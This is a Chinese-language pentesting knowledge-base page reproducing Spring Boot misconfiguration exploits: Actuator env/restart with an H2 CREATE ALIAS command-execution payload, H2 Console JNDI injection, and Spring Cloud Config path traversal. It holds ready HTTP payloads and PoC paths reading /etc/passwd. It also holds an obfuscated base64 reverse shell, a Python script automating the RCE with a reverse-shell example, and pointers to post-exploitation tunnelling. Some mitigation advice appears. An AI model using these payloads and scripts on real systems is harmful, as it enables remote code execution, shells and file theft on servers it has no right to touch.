---
title: Spring Boot Actuator 配置不当 RCE 利用链复现
description: 详细记录 Spring Boot 2.x Actuator 暴露 env 与 restart 端点，结合 H2 数据库 CREATE ALIAS
  实现任意命令执行的完整利用链；补充 H2 Console JNDI 注入及 Spring Cloud Config 目录穿越利用方式。
category: ai-security
tags:
- Spring Boot
- Actuator
- RCE
- H2 Database
- JNDI Injection
- Spring Cloud Config
- 目录穿越
- 漏洞复现
date: 2024-01-15
updated: '2026-11-12'
---
## 概述

本页面汇总 Spring Boot 2.x 生态中三类高危误配置漏洞的利用细节：
1. **Actuator `env` + `restart` 端点联动 H2 `CREATE ALIAS` 实现 RCE**
2. **H2 Console 开启 `web-allow-others` 导致 JNDI 注入 RCE**
3. **Spring Cloud Config Server 目录穿越读取任意文件**

所有利用均基于 **配置不当** 而非框架本身代码缺陷，属于攻击面管理的核心排查项。

---

## Spring Boot 2.x Actuator `env` + `restart` + H2 `CREATE ALIAS` RCE

### 影响版本与前置条件
| 组件 | 版本/条件 |
|------|-----------|
| spring-boot-starter-actuator | 2.x |
| 依赖 H2 数据库 | `spring-boot-starter-data-jpa` + `com.h2database:h2` |
| 端点暴露 | `management.endpoints.web.exposure.include=env,restart`（或 `*`） |
| 权限 | 无认证/弱认证可直接访问 Actuator HTTP API |

### 利用原理
1. **`/actuator/env` (POST)**：动态修改 `spring.datasource.hikari.connection-test-query`，注入 H2 `CREATE ALIAS` 语句，将任意命令封装为 Java 静态方法 `EXEC(cmd)`。
2. **`/actuator/restart` (POST)**：触发应用上下文重启，H2 连接池初始化时执行 `connection-test-query`，从而调用 `EXEC()` 执行命令。

> **关键点**：`connection-test-query` 在连接池获取连接前执行，重启会强制重建连接池，保证 Payload 触发。

### 完整利用流程

#### Step 1 注入恶意 `connection-test-query`
```http
POST /actuator/env HTTP/1.1
Host: target:port
Content-Type: application/json

{
  "name": "spring.datasource.hikari.connection-test-query",
  "value": "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'; CALL EXEC('curl http://attacker.dnslog.cn');"
}
```
- `Content-Type: application/json` **必须**，否则 Spring 不解析 Body。
- Payload 中 `CALL EXEC('...')` 可替换为任意命令（如反弹 Shell）。

#### Step 2 触发重启执行命令
```http
POST /actuator/restart HTTP/1.1
Host: target:port
Content-Type: application/json

{}
```
- 返回 `200` 且 Body 包含 `"message": "Restarting..."` 即表示重启已触发。
- 观察 DNSLog / 反连平台确认命令执行。

### 验证与排查清单
| 检查项 | 命令/路径 | 判定标准 |
|--------|-----------|----------|
| Actuator 端点列表 | `GET /actuator` | 返回 `env`、`restart` 等敏感端点 |
| `env` 写入权限 | `POST /actuator/env` | 200 且后续 `GET /actuator/env` 可见新键值 |
| H2 依赖 | 类路径存在 `h2-*.jar` | `mvn dependency:tree \| grep h2` |
| 连接池实现 | `spring.datasource.type=HikariCP` | 默认即为 HikariCP |

---

## Spring Boot + H2 Console JNDI 注入 RCE

### 危险配置
```yaml
spring:
  h2:
    console:
      enabled: true
      settings:
        web-allow-others: true   # 关键：允许远程访问无鉴权 Console
```

### 攻击链
1. 访问 `/h2-console` 进入 Web 管理界面。
2. **Driver Class** 填 `javax.naming.InitialContext`（触发 JNDI Lookup）。
3. **JDBC URL** 填 `rmi://attacker-ip:1099/Exploit`（指向恶意 RMI/LDAP 服务）。
4. 点击 **Connect** → 服务端发起 JNDI 连接 → 加载远程恶意类 → 任意代码执行。

### 实战工具链（以 su18/JNDI 为例）
```bash
# 1. 下载编译好的 JNDI-1.0-all.jar
# 2. 修改 config.yml 指定监听端口与 Payload
#    command: bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHMvNDQ0NyAwPiYx==}|{base64,-d}|{bash,-i}
# 3. 启动
java -jar JNDI-1.0-all.jar
```
- Base64 解码后为 `bash -i >& /dev/tcp/vps/4447 0>&1`（反弹 Shell）。
- 控制台显示 `Received connection from ...` 即成功。

### 防御建议
- 生产环境 **禁用** `spring.h2.console.enabled` 或设 `web-allow-others: false`。
- 网络层限制 `/h2-console` 仅内网/管理 IP 可达。
- 升级 H2 至 2.0.206+（默认阻断 JNDI），或配置 `spring.h2.console.settings.web-admin-password` 强认证。

---

## Spring Cloud Config Server 目录穿越

### 漏洞成因
`/foo/default/master/..%252F..%252F...` 双重 URL 编码绕过路径规范化，读取服务器任意文件（CVE-2019-3799 / CVE-2020-5410 变体）。

### 两个通用 PoC
```text
# PoC 1：标准双重编码遍历
/foo/default/master/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc/passwd

# PoC 2：前置遍历 + # 片段截断
/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/master
```
- `%252F` = `%2F` 经一次 URL 解码后仍为 `/`，二次解码生效。
- `%23` 对应 `#`，截断后续路径参数。

### 影响范围
| 组件 | 受影响版本 |
|------|------------|
| spring-cloud-config-server | < 2.2.3, < 2.1.8 |
| 依赖 `spring-cloud-config-server` 的微服务网关 | 同版本 |

### 缓解措施
- 升级至 Spring Cloud Config 2.2.3+ / 2.1.8+。
- 在网关层（Nginx/Zuul/Spring Cloud Gateway）拦截包含 `..%252F`、`%252E%252E` 的请求。
- 配置 `spring.cloud.config.server.search-paths` 限制仓库根目录，避免绝对路径穿越。

---

## 统一检测与应急响应脚本片段

### 批量探测 Actuator 敏感端点
```bash
#!/usr/bin/env bash
# 用法: ./scan_actuator.sh targets.txt
while read host; do
  curl -sk -X GET "http://$host/actuator" \
    -H "User-Agent: Mozilla/5.0" \
    -o /dev/null -w "%{http_code} $host\n" | grep -E "200|401|403"
done < "$1"
```

### 自动化利用 Actuator RCE（Python Requests）
```python
import requests, json, sys

target = sys.argv[1]
cmd = sys.argv[2]  # 例: "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"

payload = {
    "name": "spring.datasource.hikari.connection-test-query",
    "value": f"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {{ java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {{return s.next();}} throw new IllegalArgumentException();}}'; CALL EXEC('{cmd}');"
}

headers = {"Content-Type": "application/json"}
requests.post(f"http://{target}/actuator/env", json=payload, headers=headers, timeout=10)
requests.post(f"http://{target}/actuator/restart", json={}, headers=headers, timeout=10)
print("[+] Trigger sent")
```

---

## 关联知识与后续利用

- 拿到 Shell 后常需建立隧道穿透内网，可参考 [[frp内网渗透应用]] 中 Socks5 / 多级隧道 / RDP 转发等实战技巧。
- 若目标同时存在 JWT 认证体系，可结合 [[jwt漏洞原理与实战利用]] 中算法混淆、密钥爆破等手段横向提权。

---

## 参考资料
- 原文：微信公众号文章《Spring boot漏洞利用(2)》
- su18/JNDI: https://github.com/su18/JNDI
- Spring Boot Actuator 官方文档：https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html
- H2 Database JNDI 安全公告：https://h2database.com/html/security.html
- Spring Cloud Config CVE-2020-5410 分析：https://pivotal.io/security/cve-2020-5410

## 来源

- [007攻防实验室-202007-202010_5](../sources/007攻防实验室-202007-202010_5.md)
